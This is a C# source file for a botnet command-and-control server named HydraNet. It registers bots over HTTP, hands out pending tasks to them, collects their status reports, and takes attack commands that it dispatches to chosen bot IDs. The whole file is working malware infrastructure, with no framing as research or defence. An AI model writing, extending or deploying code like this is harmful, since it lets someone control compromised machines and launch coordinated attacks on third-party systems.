namespace HydraNet.C2.Server;

using System.Net;
using System.Text;
using System.Text.Json;

public sealed class C2Server
{
    private readonly HttpListener _listener;
    private readonly BotManager _botManager;
    private readonly AttackDispatcher _dispatcher;
    private bool _running;

    public C2Server(int port)
    {
        _listener = new HttpListener();
        _listener.Prefixes.Add($"http://+:{port}/");
        _botManager = new BotManager();
        _dispatcher = new AttackDispatcher(_botManager);
    }

    public async Task StartAsync()
    {
        _listener.Start();
        _running = true;

        while (_running)
        {
            try
            {
                var context = await _listener.GetContextAsync();
                _ = Task.Run(() => HandleRequest(context));
            }
            catch (HttpListenerException) when (!_running)
            {
                break;
            }
        }
    }

    public void Stop()
    {
        _running = false;
        _listener.Stop();
    }

    private async Task HandleRequest(HttpListenerContext context)
    {
        var path = context.Request.Url?.AbsolutePath ?? "/";
        var method = context.Request.HttpMethod;

        object? responseBody = path switch
        {
            var p when p.Contains("/register") && method == "POST" => await HandleRegister(context),
            var p when p.Contains("/task") && method == "GET" => HandleGetTask(context),
            var p when p.Contains("/status") && method == "POST" => await HandleStatus(context),
            var p when p.Contains("/attack") && method == "POST" => await HandleAttackCommand(context),
            "/api/bots" when method == "GET" => _botManager.GetAllBots(),
            _ => new { error = "Not found" }
        };

        var json = JsonSerializer.Serialize(responseBody);
        var buffer = Encoding.UTF8.GetBytes(json);
        context.Response.ContentType = "application/json";
        context.Response.ContentLength64 = buffer.Length;
        await context.Response.OutputStream.WriteAsync(buffer);
        context.Response.Close();
    }

    private async Task<object> HandleRegister(HttpListenerContext context)
    {
        using var reader = new StreamReader(context.Request.InputStream);
        var body = await reader.ReadToEndAsync();
        var info = JsonSerializer.Deserialize<Dictionary<string, string>>(body);
        if (info is not null && info.TryGetValue("bot_id", out var botId))
        {
            _botManager.Register(botId, info);
            return new { status = "registered", bot_id = botId };
        }
        return new { error = "Invalid registration" };
    }

    private object? HandleGetTask(HttpListenerContext context)
    {
        var segments = context.Request.Url?.Segments;
        if (segments is { Length: >= 4 })
        {
            var botId = segments[3].TrimEnd('/');
            return _dispatcher.GetPendingTask(botId);
        }
        return null;
    }

    private async Task<object> HandleStatus(HttpListenerContext context)
    {
        using var reader = new StreamReader(context.Request.InputStream);
        var body = await reader.ReadToEndAsync();
        return new { received = true, body };
    }

    private async Task<object> HandleAttackCommand(HttpListenerContext context)
    {
        using var reader = new StreamReader(context.Request.InputStream);
        var body = await reader.ReadToEndAsync();
        var command = JsonSerializer.Deserialize<Models.AttackCommand>(body);
        if (command is not null)
        {
            _dispatcher.Dispatch(command);
            return new { status = "dispatched", targets = command.BotIds.Length };
        }
        return new { error = "Invalid command" };
    }
}
